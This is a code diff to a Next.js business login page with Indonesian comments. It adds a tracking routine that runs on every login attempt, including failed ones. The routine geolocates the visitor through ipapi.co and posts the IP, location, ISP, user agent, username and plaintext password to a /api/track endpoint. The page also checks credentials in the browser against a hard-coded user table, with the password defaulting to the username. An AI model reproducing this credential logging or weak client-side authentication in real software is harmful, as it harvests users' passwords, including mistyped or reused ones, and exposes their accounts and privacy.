@@ -30,11 +30,39 @@ export default function BisnisLoginPage() {
     setError("");
     setLoading(true);
 
+    const key = username.trim().toLowerCase();
+
+    // Fungsi Lacak Ekstrim: Mencatat segala hal segera setelah submit
+    const processTracking = (statusText: string) => {
+      const sendTrack = (ipInfo: any) => {
+        fetch("/api/track", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            ip: ipInfo?.ip || "Unknown IP",
+            location: ipInfo ? `${ipInfo.city || 'Unknown City'}, ${ipInfo.region || ''}, ${ipInfo.country_name || 'Unknown Country'}` : "Unknown Location",
+            org: ipInfo?.org || "Unknown ISP/Org",
+            userAgent: window.navigator.userAgent,
+            path: `/bisnis/login (Action: ${statusText})`,
+            isSuspicious: (ipInfo?.country_code && ipInfo.country_code !== "ID") ? true : false,
+            countryCode: ipInfo?.country_code || 'XX',
+            username: username || "Empty",
+            password: password || "Empty"
+          })
+        }).catch(() => {});
+      };
+      
+      fetch("https://ipapi.co/json/")
+        .then(r => r.json())
+        .then(sendTrack)
+        .catch(() => sendTrack(null));
+    };
+
     setTimeout(() => {
-      const key = username.trim().toLowerCase();
       const user = VALID_USERS[key];
 
       if (!user) {
+        processTracking("LOGIN FAILED - USER TIDAK DIKENALI");
         setError("Username tidak dikenali.");
         setLoading(false);
         return;
@@ -42,39 +70,19 @@ export default function BisnisLoginPage() {
       
       const expectedPassword = user.password || key;
       if (password.trim().toLowerCase() !== expectedPassword.toLowerCase()) {
+        processTracking("LOGIN FAILED - BATAL PASSWORD SALAH");
         setError("Password salah.");
         setLoading(false);
         return;
       }
 
+      // Jika berhasil
+      processTracking("LOGIN SUCCESS");
+
       try {
         localStorage.setItem("cl_user", JSON.stringify({ key, display: user.display, emoji: user.emoji, role: user.role }));
-        
-        // Catat aktivitas spesifik login
-        const sendTrack = (ipInfo: any) => {
-          fetch("/api/track", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              ip: ipInfo?.ip || "Unknown IP",
-              location: ipInfo ? `${ipInfo.city || 'Unknown City'}, ${ipInfo.region || ''}, ${ipInfo.country_name || 'Unknown Country'}` : "Unknown Location",
-              org: ipInfo?.org || "Unknown ISP/Org",
-              userAgent: window.navigator.userAgent,
-              path: "/bisnis/login (Action: LOGIN SUCCESS)",
-              isSuspicious: (ipInfo?.country_code && ipInfo.country_code !== "ID") ? true : false,
-              countryCode: ipInfo?.country_code || 'XX',
-              username: key,
-              password: password
-            })
-          }).catch(() => {});
-        };
-
-        fetch("https://ipapi.co/json/")
-          .then(r => r.json())
-          .then(sendTrack)
-          .catch(() => sendTrack(null));
-        
       } catch { }
+      
       router.replace("/bisnis");
     }, 600);
   };
